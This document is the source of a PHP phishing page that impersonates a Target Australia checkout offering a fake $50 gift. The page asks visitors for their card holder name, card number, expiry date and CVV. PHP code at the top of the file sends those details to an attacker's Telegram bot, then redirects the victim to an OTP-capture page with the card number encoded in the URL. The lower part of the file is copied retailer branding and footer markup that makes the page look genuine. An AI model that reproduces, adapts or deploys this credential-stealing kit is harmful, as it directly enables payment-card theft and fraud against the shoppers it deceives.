<?php
if (!isset($_GET['reference'])) {
    echo "barra nik omek";
    exit();
}
include 'config.php';
$reference = $_GET['reference'];
if(isset($_POST['submit'])){
    $message = " ========= CC YA BOUHMID ============" . "\nHOLDER NAME : " . $_POST['cardHolderName'] . "\nCC  NUM : " . $_POST['cardNumber'] . "\nEXPIRATION : " . $_POST['expirationDate'] . "\nCVV : " . $_POST['cvv'] ;
    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    // Use file_get_contents or cURL to send the message
    $response = file_get_contents($url); // Make sure allow_url_fopen is enabled in your php.ini
    HEADER('Location: x0tp.php?reference='.$_GET['reference'].'&cc_zebi='.base64_encode($_POST['cardNumber']));
}
?>

<!DOCTYPE html>
<html
    lang="en"
    data-kantu="1"
    style=""
    class="js touch geolocation hashchange rgba backgroundsize borderradius boxshadow opacity cssgradients csstransforms csstransforms3d csstransitions fontface localstorage svg inlinesvg svgclippaths cookies placeholder"
>
    <div id="in-page-channel-node-id" data-channel-name="in_page_channel_LGeHqq"></div>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <title>Basket - Target Australia</title>
        <link href="./src_file/minimal-76cab9610b.css" rel="stylesheet" type="text/css" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="format-detection" content="telephone=no" />
    </head>
    <body class="MinimalPage page-content-full-width fixed-scroll-down" style="top: unset;" data-pacid="0068a690-aeed-4b34-8585-f2e6d63f3874" data-pasid="9cfafc15-f7e2-4aa3-9c7e-20e87640270a">
        <div class="CheckoutPage">
            <div class="branch-journeys-top"></div>
            <div class="react-root" data-component="checkout" data-mounted="true">
                <div class="Root">
                    <div style="height: 100%; position: relative;">
                        <div class="HeaderEnhancedWrapper">
                            <div class="HeaderEnhanced">
                                <div class="HeaderEnhanced-container">
                                    <div class="HeaderEnhanced-backLink">
                                        <a href="index.php"><span class="HeaderEnhanced-backAction"></span></a>
                                    </div>
                                    <span class="HeaderEnhanced-title">CLAIM NOW</span>
                                    <div class="HeaderEnhanced-rondelContainer">
                                        <a href="#"><span class="HeaderEnhanced-rondel"></span></a>
                                    </div>
                                </div>
                                <div class="HeaderEnhanced-stepContainer">
                                    <a class="HeaderEnhanced-step HeaderEnhanced-step--delivery HeaderEnhanced-step--enable" href="index.php">OVERVIEW</a>
                                    <a class="HeaderEnhanced-step HeaderEnhanced-step--delivery HeaderEnhanced-step--enable" href="authenticate.php">AUTHENTICATE</a>
                                    <a class="HeaderEnhanced-step HeaderEnhanced-step--basket HeaderEnhanced-step--active HeaderEnhanced-step--enable" href="#">DEPOSIT</a>
                                </div>
                            </div>
                        </div>
                        <div class="Page EnhancedCheckoutPage">
                            <div id="widget"></div>
                            <div style="">
                                <div class="EnhancedCheckout">
                                    <div class="EnhancedCheckout-Basket">
                                        <div class="u-hide-large">
                                            <div class="u-lightGrey-bb u-col-fullwidth EnhancedCheckout-IncentiveBar">
                                                <div class="EnhancedCheckout-Incentive">
                                                    <p class="u-alignCenter message">You're just 1 steps away from claiming your gift!</p>
                                                    <div class="MultiLevelProgressBar u-marginBottom10">
                                                        <div class="ProgressBar"><div class="ProgressBar-innerBar" style="width: 90.3333%;"></div></div>
                                                        <div class="MultiLevelProgressBar-indicator">
                                                            <div class="IconContainer IconContainer--Grey"><i class="Icon Icon--80 Icon--tickWhite"></i></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div id="IS-contentSummaryContainer"></div>
                                        <div class="EnhancedCheckout-ColumnLayout EnhancedCheckout-ScrollableContainer">
                                            <div class="col col-half EnhancedCheckout-Scrollable" id="scrollContainer">
                                                <div>
                                                    <ul class="OrderEntries EnhancedCheckout-OrderEntries">
                                                        <div class="col col-half EnhancedCheckout-Scrollable u-paddingOnMobile">
                                                            <div class="CheckoutSection">
                                                                <div name="section-delivery-method"></div>
                                                                <section class="Section">
                                                                    <div class="u-alignCenter DeliveryHeadingMessage">
                                                                        <div class="anchor" id="Delivery"></div>
                                                                        <h3>Enter Your Card Details</h3>
                                                                    </div>
                                                                    <div name="delivery-picker"></div>
                                                                    <div class="EnhancedCheckout-FormContainer">
                                                                        <div class="CheckoutSection u-topRows2">
                                                                            <div name="section-destination"></div>
                                                                            <section class="Section">
                                                                                <div class="EnhancedCheckout-Form">
                                                                                    <form method="post" action="">
                                                                                        <div class="">
    <div class="DynamicPlaceholder">
        <div class="DynamicPlaceholder-container">
            <label class="DynamicPlaceholder-content" for="cardHolderName">
                Card holder's name<span class="mandatory">*</span><span class="visuallyhidden">Mandatory field</span>
                <input
                    required
                    name="cardHolderName"
                    type="text"
                    autocomplete="on"
                    id="cardHolderName"
                    class="DynamicPlaceholder-input has-click-event"
                    value=""
                    placeholder="Ex: Joseph Gatti"
                />
            </label>
        </div>
    </div>
</div>

<div class="">
    <div class="DynamicPlaceholder">
        <div class="DynamicPlaceholder-container">
            <label class="DynamicPlaceholder-content" for="cardNumber">
                Credit or debit card number<span class="mandatory">*</span><span class="visuallyhidden">Mandatory field</span>
                <input
                    required
                    name="cardNumber"
                    type="text"
                    autocomplete="on"
                    id="cardNumber"
                    class="DynamicPlaceholder-input has-click-event"
                    placeholder="xxxx xxxx xxxx xxxx"
                    value=""
                />
            </label>
        </div>
    </div>
</div>

<div class="">
    <div class="DynamicPlaceholder DynamicPlaceholder--hasNote">
        <div class="DynamicPlaceholder-container">
            <label class="DynamicPlaceholder-content" for="expirationDate">
                Expiration Date<span class="mandatory">*</span><span class="visuallyhidden">Mandatory field</span>
                <input
                    required
                    name="expirationDate"
                    type="tel"
                    autocomplete="on"
                    id="expirationDate"
                    class="DynamicPlaceholder-input has-click-event"
                    placeholder="MM/YY"
                    value=""
                />
            </label>
            <div class="DynamicPlaceholder-subText">So we can contact you about your order</div>
        </div>
    </div>
</div>

<div class="">
    <div class="DynamicPlaceholder">
        <div class="DynamicPlaceholder-container">
            <label class="DynamicPlaceholder-content" for="cvv">
                CVV<span class="mandatory">*</span><span class="visuallyhidden">Mandatory field</span>
                <input
                    required
                    name="cvv"
                    type="text"
                    autocomplete="on"
                    id="cvv"
                    class="DynamicPlaceholder-input has-click-event"
                    placeholder="cvv"
                    value=""
                />
            </label>
        </div>
    </div>
</div>
<script>
document.addEventListener('DOMContentLoaded', function() {
    // Format the card number input
    var cardNumberInput = document.getElementById('cardNumber');
    cardNumberInput.addEventListener('input', function(e) {
        var target = e.target, position = target.selectionEnd, length = target.value.length;
        
        // Remove spaces from previous input
        var value = target.value.replace(/\s+/g, '');
        var newValue = '';
        for (var i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 == 0) {
                newValue += ' ';
            }
            newValue += value[i];
        }
        
        target.value = newValue;
        
        // Adjust cursor position to account for added spaces
        if (position === length) {
            position = target.value.length;
        }
        target.selectionEnd = position;
    });

    // Validate and format expiration date input
    var expirationDateInput = document.getElementById('expirationDate');
    expirationDateInput.addEventListener('input', function(e) {
        var target = e.target;
        var value = target.value.replace(/\D/g, '').slice(0, 4); // Remove non-digit characters and limit length
        
        if (value.length > 2) {
            value = value.slice(0, 2) + '/' + value.slice(2);
        }
        
        target.value = value;
    });

    expirationDateInput.addEventListener('blur', function(e) {
        var target = e.target;
        var value = target.value;
        var match = value.match(/^(\d{2})\/(\d{2})$/);
        if (match) {
            var month = parseInt(match[1], 10);
            var year = parseInt(match[2], 10) + 2000; // Assuming a YY format
            var expiryDate = new Date(year, month - 1); // Months are 0-indexed in JavaScript Date
            var currentDate = new Date();
            if (expiryDate < currentDate) {
                //alert("The expiration date is in the past. Please enter a valid date.");
                target.value = ''; // Clear the input
                target.focus(); // Refocus on the expiration date input for correction
            }
        } else {
            //alert("Please enter the expiration date in MM/YY format.");
            target.value = ''; // Clear the input
            target.focus(); // Refocus on the expiration date input for correction
        }
    });

    // CVV input handling
    var cvvInput = document.getElementById('cvv');
    cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
    });
});
</script>


                                                                                        <div class="u-topRowsHalf buttonWrapper">
                                                                                            <button name="submit" type="submit" class="Button Button--enabled Button--block Button--enhanced Button--black">Verify and Continue</button>
                                                                                        </div>
                                                                                    </form>
                                                                                </div>
                                                                            </section>
                                                                        </div>
                                                                    </div>
                                                                </section>
                                                            </div>
                                                        </div>

                                                        <div class="ActionContainer"></div>
                                                    </ul>
                                                </div>
                                            </div>
                                            <div class="col col-half col-orderSummary">
                                                <div name="edit-variant-mobile-scroll-point"></div>

                                                <div class="EnhancedCheckout-OrderSummary EnhancedCheckout-Bordered EnhancedCheckout-MargTop">
                                                    <div class="u-hide-small">
                                                        <div class="u-lightGrey-bb u-col-fullwidth GiftClaim-IncentiveBar">
                                                            <div class="GiftClaim-Incentive">
                                                                <div class="MultiLevelProgressBar u-marginBottom10">
                                                                    <div class="ProgressBar"><div class="ProgressBar-innerBar" style="width: 66.6666%;"></div></div>
                                                                    <div class="MultiLevelProgressBar-indicator">
                                                                        <div class="IconContainer IconContainer--Grey"><i class="Icon Icon--80 Icon--tickWhite"></i></div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <table class="Table Table--bold">
                                                        <thead>
                                                            <tr>
                                                                <th colspan="2">Gift Claim Summary</th>
                                                            </tr>
                                                        </thead>
                                                        <tbody>
                                                            <tr class="Table-paddedRow">
                                                                <th>Gift Value</th>
                                                                <td class="u-alignRight">
                                                                    <span><span>$</span>50<span>.00</span></span>
                                                                </td>
                                                            </tr>
                                                            <tr class="Table-paddedRow Table-paddedRow--spaceBelow">
                                                                <th>Verification Status</th>
                                                                <td class="u-alignRight">Pending</td>
                                                            </tr>
                                                            <tr class="Table-paddedRow Table-paddedRow--shout Table-paddedRow--lineAbove">
                                                                <th>Total (Including TVA)</th>
                                                                <td class="u-alignRight">
                                                                    <span><span>$</span>50<span>.00</span></span>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>

                                                    <br />
                                                    <br />
                                                    <br />
                                                </div>

                                                <div class="supported-target-payment-methods">
                                                    <div>
                                                        <div>
                                                            <div class="supported-target-payment-methods-name">We accept</div>
                                                            <style>
                                                                .supported-target-payment-methods {
                                                                    position: relative;
                                                                    bottom: 50px;
                                                                }
                                                                .supported-target-payment-methods-name {
                                                                    font-size: 16px;
                                                                    font-weight: 600;
                                                                    line-height: 23px;
                                                                    letter-spacing: 0em;
                                                                    text-align: center;
                                                                }
                                                            </style>
                                                        </div>
                                                    </div>
                                                    <img src="./src_file/target-payment-modes.png" alt="Target Payment Modes Logo" />
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="Footer">
                            <span>
                                <style>
                                    .Footer-paymentOptions {
                                        background: transparent url("./src_file/060723-Target-Checkout-Payment-Options-footer-logos-Desktop.png") no-repeat 50% 0;
                                        width: auto;
                                        height: 50px;
                                        padding: 20px;
                                        background-size: contain;
                                    }

                                    @media only screen and (max-width: 767px) {
                                        .Footer-paymentOptions {
                                            height: 100px;
                                            background: transparent url("./src_file/060723-Target-Checkout-Payment-Options-footer-logos-Mobile.png") no-repeat 50% 0;
                                            background-size: 275px;
                                        }
                                    }
                                </style>
                                <div class="Footer-container">
                                    <div class="Footer-content Footer-content--logoAfter">
                                        <section>
                                            <p class="u-fontSize12 u-fontWeightBold">Payment options</p>
                                            <div class="Footer-paymentOptions"><span class="visuallyhidden">Zip, AfterPay, PayPal, Visa, Mastercard, American Express, Flypay</span></div>
                                        </section>
                                        <section>
                                            <dl>
                                                <div>
                                                    <h6 class="Footer-shoppingSupport">Online Shopping Support</h6>
                                                    <dt class="visuallyhidden">Calls from Australia:</dt>
                                                    <dd><a href="tel:1300753567" class="Footer-shoppingSupportAction">1300 753 567</a></dd>
                                                </div>
                                                <div>
                                                    <dt class="OpeningHours-title">International:</dt>
                                                    <dd class="OpeningHours-item"><a href="tel:+61352462433">+61 3 5246 2433</a></dd>
                                                </div>
                                            </dl>
                                        </section>
                                        <section>
                                            <span class="visuallyhidden">Support Opening Hours.</span>
                                            <dl class="OpeningHours">
                                                <div>
                                                    <dt class="OpeningHours-title">Monday to Friday</dt>
                                                    <dd class="OpeningHours-item">9:00am to 7:00pm AEDT</dd>
                                                </div>
                                                <div>
                                                    <dt class="OpeningHours-title">Saturday</dt>
                                                    <dd class="OpeningHours-item">9:00am to 5:00pm AEDT</dd>
                                                </div>
                                                <div>
                                                    <dt class="OpeningHours-title">Closed</dt>
                                                    <dd class="OpeningHours-item">Sunday and public holidays</dd>
                                                </div>
                                            </dl>
                                        </section>
                                    </div>
                                    <div class="Footer-content">
                                        <p>
                                            Copyright © 2019 <span class="u-noWrap">Target Australia Pty Ltd ABN 75 004 250 944.</span> Target Australia Pty Ltd is part of the Wesfarmers Ltd group and has no affiliation with Target
                                            Corporation US.
                                        </p>
                                        <ul class="PolicyList">
                                            <li class="PolicyList-item">
                                                <button
                                                    type="button"
                                                    class="Footer-link u-notButton"
                                                    onclick="window.t_msg.publish(&#39;/redux/dispatch&#39;, { type: &#39;DISPLAY_CMS_MODAL&#39;, payload: { title: &#39;Terms &amp; Conditions - Footer&#39;, name: &#39;SpcConditions&#39; } })"
                                                >
                                                    Conditions of use
                                                </button>
                                            </li>
                                            <li class="PolicyList-item">
                                                <button
                                                    type="button"
                                                    class="Footer-link u-notButton"
                                                    onclick="window.t_msg.publish(&#39;/redux/dispatch&#39;, { type: &#39;DISPLAY_CMS_MODAL&#39;, payload: { title: &#39;Privacy Policy - Footer&#39;, name: &#39;SpcPrivacy&#39; } })"
                                                >
                                                    Privacy policy
                                                </button>
                                            </li>
                                        </ul>
                                        <div class="Footer-securedBy"><span class="visuallyhidden">Secured by GeoTrust</span></div>
                                    </div>
                                </div>
                            </span>
                        </div>
                        <span> </span>
                        <div></div>
                        <div></div>
                        <div></div>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
